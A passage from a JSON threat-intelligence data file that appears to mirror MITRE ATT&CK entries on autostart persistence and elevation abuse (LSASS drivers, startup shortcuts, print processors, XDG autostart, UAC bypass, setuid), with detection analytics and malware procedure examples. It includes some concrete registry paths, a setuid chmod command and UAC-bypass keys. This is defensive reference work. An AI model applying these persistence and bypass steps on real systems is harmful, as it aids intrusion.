      "Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened."
    ],
    "Procedure Examples": [
      "This feature can be disabled entirely with the following terminal command:defaults write -g ApplePersistence -bool no.",
      "Holding the Shift key while logging in prevents apps from opening automatically.[1]"
    ]
  },
  "T1547.008": {
    "Name": "Boot or Logon Autostart Execution:LSASS Driver",
    "Description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.[1]Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g.,Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",
    "Detects": [
      "With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers.[7]Utilize the Sysinternals Autoruns/Autorunsc utility[9]to examine loaded drivers associated with the LSA.",
      "Monitor newly constructed files that may modify or add LSASS drivers to obtain persistence on compromised systems.",
      "Monitor for changes made to files that may modify or add LSASS drivers to obtain persistence on compromised systems.",
      "Also monitor DLL load operations in lsass.exe.[8]"
    ],
    "Procedure Examples": [
      "Pasamestablishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.[2]",
      "Wingbirddrops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.[3][4]"
    ]
  },
  "T1547.009": {
    "Name": "Boot or Logon Autostart Execution:Shortcut Modification",
    "Description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.[1]Although often used as payloads in an infection chain (e.g.Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusingMasqueradingto make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g.Browser Extensions) to persistently launch malware.",
    "Detects": [
      "Monitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.[36]Analysis should attempt to relate shortcut creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.",
      "Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.",
      "Monitor for newly executed processes that may create or edit shortcuts to run a program during system boot or user login."
    ],
    "Procedure Examples": [
      "APT39has modified LNK shortcuts.[2]",
      "Astaroth's initial payload is a malicious .LNK file.[3][4]",
      "BACKSPACEachieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[5]",
      "Bazarcan establish persistence by writing shortcuts to the Windows Startup folder.[6][7]",
      "TheBlackEnergy3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[8]",
      "Comnieestablishes persistence via a .lnk file in the victim’s startup path.[9]",
      "Empirecan persist by modifying a .LNK file to include a backdoor.[10]",
      "FELIXROOTcreates a .LNK file for persistence.[11]",
      "Gazercan establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.[12][13]",
      "Gorgon Groupmalware can create a .lnk file and add a Registry Run key to establish persistence.[14]",
      "Grandoreirocan write or modify browser shortcuts to enable launching of malicious browser extensions.[15]",
      "Helminthestablishes persistence by creating a shortcut.[16]",
      "InvisiMolecan use a .lnk shortcut for the Control Panel to establish persistence.[17]",
      "Kazuaradds a .lnk file to the Windows startup folder.[18]",
      "A version ofKONNIdrops a Windows shortcut on the victim’s machine to establish persistence.[19]",
      "Lazarus Groupmalware has maintained persistence on a system by creating a LNK shortcut in the user’s Startup folder.[20]",
      "Leviathanhas used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[21][22]",
      "MarkiRATcan modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable.[23]",
      "Micropsiacreates a shortcut to maintain persistence.[24]",
      "Okrumcan establish persistence by creating a .lnk shortcut to itself in the Startup folder.[25]",
      "Reavercreates a shortcut file and saves it in a Startup folder to establish persistence.[26]",
      "RedLeavesattempts to add a shortcut file in the Startup folder to achieve persistence.[27][28]",
      "RogueRobinestablishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in.[29][30]",
      "S-Typemay create the file%HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk, which points to the maliciousmsdtc.exefile already created in the%CommonFiles%directory.[31]",
      "SeaDukeis capable of persisting via a .lnk file stored in the Startup directory.[32]",
      "SHIPSHAPEachieves persistence by creating a shortcut in the Startup folder.[5]",
      "SPACESHIPachieves persistence by creating a shortcut in the current user's Startup folder.[5]",
      "To establish persistence,SslMMidentifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[33]",
      "TinyZBotcan create a shortcut in the Windows startup folder for persistence.[34]"
    ]
  },
  "T1547.010": {
    "Name": "Boot or Logon Autostart Execution:Port Monitors",
    "Description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through theAddMonitorAPI call to set a DLL to be loaded at startup.[1]This DLL can be located inC:\\Windows\\System32and will be loaded and run by the print spooler service,spoolsv.exe, under SYSTEM level permissions on boot.[2]Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to theDrivervalue of an existing or new arbitrarily named subkey ofHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:Local PortStandard TCP/IP PortUSB MonitorWSD Port",
    "Detects": [
      "Monitor newly constructed files that may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation.",
      "Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious.",
      "Monitor process API calls toAddMonitor.[1]",
      "Monitor Registry writes toHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism[3]"
    ],
    "Procedure Examples": []
  },
  "T1547.012": {
    "Name": "Boot or Logon Autostart Execution:Print Processors",
    "Description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service,spoolsv.exe, during boot.[1]Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through theAddPrintProcessorAPI call with an account that hasSeLoadDriverPrivilegeenabled. Alternatively, a print processor can be registered to the print spooler service by adding theHKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\DriverRegistry key that points to the DLL.For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with theGetPrintProcessorDirectoryAPI call, or referenced via a relative path from this directory.[2]After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.[3]The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
    "Detects": [
      "Monitor for unusual kernel driver installation activity that may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.",
      "Monitor for newly constructed files that may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.",
      "Monitor for abnormal DLLs that are loaded byspoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.  New print processor DLLs are written to the print processor directory.",
      "Monitor process API calls toAddPrintProcessorandGetPrintProcessorDirectory.",
      "Monitor Registry writes toHKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\[Windows architecture]\\Print Processors\\[user defined]\\DriverorHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\[Windows architecture]\\Print Processors\\[user defined]\\Driveras they pertain to print processor installations."
    ],
    "Procedure Examples": [
      "Earth Luscahas added the Registry keyHKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\UDPrint\" /v Driver /d \"spool.dll /fto load malware as a Print Processor.[4]",
      "Gelsemiumcan drop itself inC:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dllto be loaded automatically by the spoolsv Windows service.[5]",
      "ThePipeMoninstaller has modified the Registry keyHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processorsto installPipeMonas a Print Processor.[3]"
    ]
  },
  "T1547.013": {
    "Name": "Boot or Logon Autostart Execution:XDG Autostart Entries",
    "Description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (.desktop) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.[1][2]Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to theExecdirective in the.desktopconfiguration file. When the user’s desktop environment is loaded at user login, the.desktopfiles located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the/etc/xdg/autostartdirectory while the user entries are located in the~/.config/autostartdirectory.Adversaries may combine this technique withMasqueradingto blend malicious Autostart entries with legitimate programs.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may modify XDG autostart entries to execute programs or commands during system boot.",
      "Malicious XDG autostart entries may be detected by auditing file creation events within the/etc/xdg/autostartand~/.config/autostartdirectories. Depending on individual configurations, defenders may need to query the environment variables$XDG_CONFIG_HOMEor$XDG_CONFIG_DIRSto determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.",
      "Malicious XDG autostart entries may be detected by auditing file modification events within the/etc/xdg/autostartand~/.config/autostartdirectories. Depending on individual configurations, defenders may need to query the environment variables$XDG_CONFIG_HOMEor$XDG_CONFIG_DIRSto determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.",
      "Monitor newly executed processes that may modify XDG autostart entries to execute programs or commands during system boot."
    ],
    "Procedure Examples": [
      "CrossRATcan use an XDG Autostart to establish persistence.[3]",
      "If executing without root privileges,Fysbisadds a.desktopconfiguration file to the user's~/.config/autostartdirectory.[3][4]",
      "NETWIREcan use XDG Autostart Entries to establish persistence on Linux systems.[5]",
      "Pupycan use an XDG Autostart to establish persistence.[3]",
      "When executing with user-level permissions,RotaJakirocan install persistence using a .desktop file under the$HOME/.config/autostart/folder.[6]"
    ]
  },
  "T1547.014": {
    "Name": "Boot or Logon Autostart Execution:Active Setup",
    "Description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.[1]These programs will be executed under the context of the user and will have the account's associated permissions level.Adversaries may abuse Active Setup by creating a key underHKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\and setting a malicious value forStubPath. This value will serve as the program that will be executed when a user logs into the computer.[2][3][4][5][6]Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also useMasqueradingto make the Registry entries look as if they are associated with legitimate programs.",
    "Detects": [
      "Monitor executed commands and arguments that may achieve persistence by adding a Registry key to the Active Setup of the local machine.",
      "Monitor newly executed processes that may achieve persistence by adding a Registry key to the Active Setup of the local machine.",
      "Monitor Registry key additions toHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.[9]Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.",
      "Monitor Registry key modifications toHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.[9]Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data."
    ],
    "Procedure Examples": [
      "PoisonIvycreates a Registry key in the Active Setup pointing to a malicious executable.[7][6][8]"
    ]
  },
  "T1547.015": {
    "Name": "Boot or Logon Autostart Execution:Login Items",
    "Description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.[1]Login items can be added via a shared file list or Service Management Framework.[2]Shared file list login items can be set using scripting languages such asAppleScript, whereas the Service Management Framework uses the API callSMLoginItemSetEnabled.Login items installed using the Service Management Framework leveragelaunchd, are not visible in the System Preferences, and can only be removed by the application that created them.[2][3]Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.[4]Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.Adversaries can utilizeAppleScriptandNative APIcalls to create a login item to spawn malicious executables.[5]Prior to version 10.5 on macOS, adversaries can add login items by usingAppleScriptto send an Apple events to the \"System Events\" process, which has an AppleScript dictionary for manipulating login items.[6]Adversaries can use a command such astell application \"System Events\" to make login item at end with properties /path/to/executable.[7][8][9]This command adds the path of the malicious executable to the login item file list located in~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm.[7]Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.[10][11][12]",
    "Detects": [
      "All login items created via shared file lists are viewable by using the System Preferences GUI or in the~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btmfile.[1][7][16][17]These locations should be monitored and audited.",
      "All login items created via shared file lists are viewable by using the System Preferences GUI or in the~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btmfile.[1][7][16][17]These locations should be monitored and audited.",
      "Monitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior, such as establishing network connections."
    ],
    "Procedure Examples": [
      "Dokuses AppleScript to install a login Item by sending Apple events to theSystem Eventsprocess.[8]",
      "Green Lambertcan addLogin Itemsto establish persistence.[13][14]",
      "NETWIREcan persist via startup options for Login items.[15]"
    ]
  },
  "T1548": {
    "Name": "Abuse Elevation Control Mechanism",
    "Description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.[1][2]An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.[3][4]",
    "Detects": [
      "Monitor executed commands and arguments that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions.",
      "Monitor the file system for files that have the setuid or setgid bits set. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).",
      "On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on theLOG_INPUTandLOG_OUTPUTdirectives in the/etc/sudoersfile. Consider monitoring for/usr/libexec/security_authtrampolineexecutions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called.",
      "Also look for any process API calls for behavior that may be indicative ofProcess Injection. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.",
      "Monitor for newly executed processes that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Cyber actors frequently escalate to the SYSTEM account after gaining entry to a Windows host, to enable them to carry out various attacks more effectively. Tools such as Meterpreter, Cobalt Strike, and Empire carry out automated steps to \"Get System\", which is the same as switching over to the System user account. Most of these tools utilize multiple techniques to try and attain SYSTEM: in the first technique, they create a named pipe and connects an instance of cmd.exe to it, which allows them to impersonate the security context of cmd.exe, which is SYSTEM. In the second technique, a malicious DLL is injected into a process that is running as SYSTEM; the injected DLL steals the SYSTEM token and applies it where necessary to escalate privileges. This analytic looks for both of these techniques.Analytic 1 - Get System Elevation(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")(ParentImage=\"C:\\Windows\\System32\\services.exe\" Image=\"C:\\Windows\\System32\\cmd.exe\"  CommandLine=\"echo\" CommandLine=\"\\pipe*\") OR (Image=\"C:\\Windows\\System32\\rundll32.exe\" CommandLine=\",a /p:*\")",
      "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions.",
      "Log cloud API calls to assume, create, or impersonate additional roles, policies, and permissions. Review uses of just-in-time access to ensure that any justifications provided are valid and only expected actions were taken.",
      "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes."
    ],
    "Procedure Examples": [
      "Raspberry Robinimplements a variation of theucmDccwCOMMethodtechnique abusing the Windows AutoElevate backdoor to bypass UAC while elevating privileges.[5]"
    ]
  },
  "T1548.001": {
    "Name": "Abuse Elevation Control Mechanism:Setuid and Setgid",
    "Description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.[1]Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e.Linux and Mac File and Directory Permissions Modification). Thechmodcommand can set these bits with bitmasking,chmod 4777 [file]or via shorthand naming,chmod u+s [file]. This will enable the setuid bit. To enable the setgid bit,chmod 2775andchmod g+scan be used.Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.[2]This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e.File and Directory Discovery). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes vials -l. Thefindcommand can also be used to search for such files. For example,find / -perm +4000 2>/dev/nullcan be used to find files with setuid set andfind / -perm +2000 2>/dev/nullmay be used for setgid. Binaries that have these bits set may then be abused by adversaries.[3]",
    "Detects": [
      "Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.",
      "Monitor the file system for files that have the setuid or setgid bits set.",
      "Monitor for changes made to files that may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context."
    ],
    "Procedure Examples": [
      "Exaramel for Linuxcan execute commands with high privileges via a specific binary with setuid functionality.[4]",
      "Keydnapadds the setuid flag to a binary so it can easily elevate in the future.[2]"
    ]
  },
  "T1548.002": {
    "Name": "Abuse Elevation Control Mechanism:Bypass User Account Control",
    "Description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.[1]If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevatedComponent Object Modelobjects without prompting the user through the UAC notification box.[2][3]An example of this is use ofRundll32to load a specifically crafted DLL which loads an auto-elevatedComponent Object Modelobject and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4]Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5]that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:eventvwr.execan auto-elevate and execute a specified binary or script.[6][7]Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.[8]",
    "Detects": [
      "Monitor executed commands and arguments that may bypass UAC mechanisms to elevate process privileges on system.",
      "Monitor newly executed processes, such aseventvwr.exeandsdclt.exe, that may bypass UAC mechanisms to elevate process privileges on system.Threat actors often, after compromising a machine, try to disable User Access Control (UAC) to escalate privileges. This is often done by changing the registry key for system policies using \"reg.exe\", a legitimate tool provided by Microsoft for modifying the registry via command prompt or scripts. This action interferes with UAC and may enable a threat actor to escalate privileges on the compromised system, thereby allowing further exploitation of the system.Analytic 1 - UAC Bypass(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")  IntegrityLevel=High|search (ParentCommandLine=\"\\\"c:\\windows\\system32\\dism.exe\\\"\"\".xml\" AND Image!=\"c:\\users\\\\appdata\\local\\temp\\\\dismhost.exe\") OR ParentImage=c:\\windows\\system32\\fodhelper.exe OR (CommandLine=\"\\\"c:\\windows\\system32\\wusa.exe\\\"/quiet\" AND User!=NOT_TRANSLATED AND CurrentDirectory=c:\\windows\\system32\\ AND ParentImage!=c:\\windows\\explorer.exe) OR CommandLine=\".exe\\\"cleanmgr.exe /autoclean\" OR (ParentImage=\"c:\\windows\\dccw.exe\" AND Image!=\"c:\\windows\\system32\\cttune.exe\") OR Image=\"c:\\program files\\windows media player\\osk.exe\" OR ParentImage=\"c:\\windows\\system32\\slui.exe\"|eval PossibleTechniques=case(like(lower(ParentCommandLine),\"%c:\\windows\\system32\\dism.exe%\"), \"UACME #23\", like(lower(Image),\"c:\\program files\\windows media player\\osk.exe\"), \"UACME #32\", like(lower(ParentImage),\"c:\\windows\\system32\\fodhelper.exe\"),  \"UACME #33\", like(lower(CommandLine),\"%.exe\\\"%cleanmgr.exe /autoclean%\"), \"UACME #34\", like(lower(Image),\"c:\\windows\\system32\\wusa.exe\"), \"UACME #36\", like(lower(ParentImage),\"c:\\windows\\%dccw.exe\"), \"UACME #37\", like(lower(ParentImage),\"c:\\windows\\system32\\slui.exe\"), \"UACME #45\")Analytic 2 - Disable UAC(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") ParentImage=\"C:\\Windows\\System32\\cmd.exe\" CommandLine=\"reg.exeHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SystemREG_DWORD /d 0*\"\"",
      "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may bypass UAC mechanisms to elevate process privileges on system.",
      "Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:* Theeventvwr.exebypass uses the[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\commandRegistry key.[6]* Thesdclt.exebypass uses the[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exeand[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommandRegistry keys.[75][76]Analysts should monitor these Registry settings for unauthorized changes.UAC Bypass is an interesting technique in that new implementations are regularly found and existing implementations may be fixed (i.e., patched) by Microsoft in new builds of Windows. Therefore, it is important to validate than detections for UAC Bypass are still relevant (i.e., they target non-patched implementations).Note: Sysmon Event ID 12 (Registry Key Create/Delete), Sysmon Event ID 13 (Registry Value Set), and Sysmon Event ID 14 (Registry Key and Value Rename) are useful for creating detections around Registry Key Modification in the context of UAC Bypass."
    ],
    "Procedure Examples": [
      "AppleJeushas presented the user with a UAC prompt to elevate privileges while installing.[9]",
      "APT29has bypassed UAC.[10]",
      "APT37has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.[11]",
      "APT38has used the legitimate applicationieinstal.exeto bypass UAC.[12]",
      "AutoIt backdoorattempts to escalate privileges by bypassing User Access Control.[13]",
      "Avaddonbypasses UAC using the CMSTPLUA COM interface.[14]",
      "Bad Rabbithas attempted to bypass UAC and gain elevated administrative privileges.[15]",
      "BADHATCHcan utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC.[16]",
      "BitPaymercan suppress UAC prompts by setting theHKCU\\Software\\Classes\\ms-settings\\shell\\open\\commandregistry key on Windows 10 orHKCU\\Software\\Classes\\mscfile\\shell\\open\\commandon Windows 7 and launching theeventvwr.mscprocess, which launchesBitPaymerwith elevated privileges.[17]",
      "BlackCatcan bypass UAC to escalate privileges.[18]",
      "BlackEnergyattempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.[19]",
      "BRONZE BUTLERhas used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.[20][21]",
      "Bumblebeehas the ability to bypass UAC to deploy post exploitation tools with elevated privileges.[22]",
      "CHIMNEYSWEEPcan make use of the WindowsSilentCleanupscheduled task to execute its payload with elevated privileges.[23]",
      "Clamblinghas the ability to bypass UAC using apassuac.dllfile.[24][25]",
      "Cobalt Grouphas bypassed UAC.[26]",
      "Cobalt Strikecan use a number of known techniques to bypass Windows UAC.[27][28]",
      "CSPY Downloadercan bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.[29]",
      "DarkGateuses two distinct User Account Control (UAC) bypass techniques to escalate privileges.[30]",
      "Downdelphbypasses UAC to escalate privileges by using a custom \"RedirectEXE\" shim database.[31]",
      "Earth Luscahas used the Fodhelper UAC bypass technique to gain elevated privileges.[32]",
      "Empireincludes various modules to attempt to bypass UAC for escalation of privileges.[33]",
      "Evilnumhas used PowerShell to bypass UAC.[34]",
      "FinFisherperforms UAC bypass.[35][36]",
      "Gelsemiumcan bypass UAC to elevate process privileges on a compromised host.[37]",
      "Grandoreirocan bypass UAC by registering as the default handler for .MSC files.[38]",
      "H1N1bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).[39]",
      "InvisiMolecan use fileless UAC bypass and create an elevated COM object to escalate privileges.[40][41]",
      "Koadichas 2 methods for elevating integrity. It can bypass UAC througheventvwr.exeandsdclt.exe.[42]",
      "KOCTOPUSwill perform UAC bypass either through fodhelper.exe or eventvwr.exe.[43]",
      "KONNIhas bypassed UAC by performing token impersonation as well as an RPC-based method, this included bypassing UAC set to \"AlwaysNotify\".[44][45]",
      "LockBit 2.0can bypass UAC through creating the Registry keyHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration.[46][47]",
      "LockBit 3.0can bypass UAC to execute code with elevated privileges through an elevated Component Object Model (COM) interface.[48]",
      "Lokibothas utilized multiple techniques to bypass UAC.[49]",
      "MuddyWateruses various techniques to bypass UAC.[50]",
      "DuringOperation Honeybee, the threat actors used the malicious NTWDBLIB.DLL andcliconfig.exeto bypass UAC protections.[51]",
      "Patchworkbypassed User Access Control (UAC).[52]",
      "PipeMoninstaller can use UAC bypass techniques to install the payload.[53]",
      "An older variant ofPLAINTEEperforms UAC bypass.[54]",
      "PoshC2can utilize multiple methods to bypass UAC.[55]",
      "Pupycan bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.[56]",
      "QuasarRATcan generate a UAC pop-up Window to prompt the target user to run a command as the administrator.[57]",
      "Ramsaycan useUACMefor privilege escalation.[58][59]",
      "Raspberry Robinwill use the legitimate Windows utility fodhelper.exe to run processes at elevated privileges without requiring a User Account Control prompt.[60]",
      "RCSessioncan bypass UAC to escalate privileges.[24]",
      "Remcoshas a command for UAC bypassing.[61]",
      "RTMcan attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.[62]",
      "Saint Bothas attempted to bypass UAC usingfodhelper.exeto escalate privileges.[63]",
      "Sakulacontains UAC bypass code for both 32- and 64-bit systems.[64]",
      "Shamoonattempts to disable UAC remote restrictions by modifying the Registry.[65]",
      "ShimRathas hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.[66]",
      "SILENTTRINITYcontains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the.mscfile extension.[67]",
      "Slivercan leverage multiple techniques to bypass User Account Control (UAC) on Windows systems.[68]",
      "AThreat Group-3390tool can use a public UAC bypass method to elevate privileges.[69]",
      "UACMecontains many methods for bypassing Windows User Account Control on multiple versions of the operating system.[5]",
      "WarzoneRATcan usesdclt.exeto bypass UAC in Windows 10 to escalate privileges; for older Windows versionsWarzoneRATcan use the IFileOperation exploit to bypass the UAC module.[70][71]",
      "WastedLockercan perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.[72]",
      "Winnti for Windowscan use a variant of the sysprep UAC bypass.[73]",
      "ManyZeroTsamples can perform UAC bypass by using eventvwr.exe to execute a malicious file.[74]"
    ]
  },
  "T1548.003": {
    "Name": "Abuse Elevation Control Mechanism:Sudo and Sudo Caching",
